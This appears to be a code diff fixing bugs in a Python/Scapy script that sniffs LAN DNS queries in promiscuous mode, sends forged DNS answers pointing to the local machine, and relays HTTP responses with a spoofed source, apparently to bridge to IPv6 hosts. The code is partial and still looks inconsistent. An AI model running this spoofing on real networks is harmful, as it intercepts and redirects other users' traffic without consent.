@@ -6,7 +6,7 @@ import time
 running = True
 DnsRequestBuffer = []
 HttpRequestBuffer = []
-me = "192.168.0.16"
+me = "192.168.0.14"
 DNSServerv4 = "8.8.8.8"
 DNSServerv6 = ""
 DNSServer = DNSServerv4
@@ -34,7 +34,7 @@ class DnsListener (threading.Thread):
 			request = sniff(filter="port 53", count=1, iface="eth0", promisc=1, timeout=1)
 			if len(request) < 1: continue
 			if not request[0].haslayer(DNS) or request[0].qr: continue
-			if request[0].src = me: continue
+			if request[0].src == me: continue
 			self.connList.append(request[0])
 
 
@@ -47,7 +47,7 @@ class DnsHijacker (threading.Thread):
 		domainName = self.request[2].qd.qname
 		lookupIP = DNSQuery(domainName)
 		if not lookupIP is None: return
-		response = IP(dst=self.request.src)/UDP()/DNS(an=DNSRR(rrname=domainName rdata=me))
+		response = IP(dst=self.request.src)/UDP()/DNS(an=DNSRR(rrname=domainName, rdata=me))
 		send(response)
 
 
@@ -103,15 +103,14 @@ class HttpResponder (threading.Thread):
 		threading.Thread.__init__(self)
 
 	def run(self):
-		httpReq = string.split(request[0][3].load, None, 3)
+		httpReq = string.split(request[3].load, None, 3)
 		domainName = httpReq[2]
 		if(domainMapping[domainName]):
 			destination = domainMapping[domainName]
-			v6HttpReq = IP(dst=destination)/TCP(dport=80)/Raw(load=request[0][3].load)
+			v6HttpReq = IP(dst=destination)/TCP(dport=80)/Raw(load=request[3].load)
 			response = sr1(v6HttpReq)
-			#replace source/destination stuff in respoonse
-			send(response)
-			# etc...
+			newResponse = IP(src=me, dst=request.src)/TCP()/Raw(load=response[3].load)
+			send(newResponse)
 
 
 
@@ -125,7 +124,7 @@ httplistener = HttpListener(HttpRequestBuffer)
 httplistener.start()
 
 httprunner = HttpRunner(HttpRequestBuffer)
-HttpRunner.start()
+httprunner.start()
 
 while 1:
 	try:
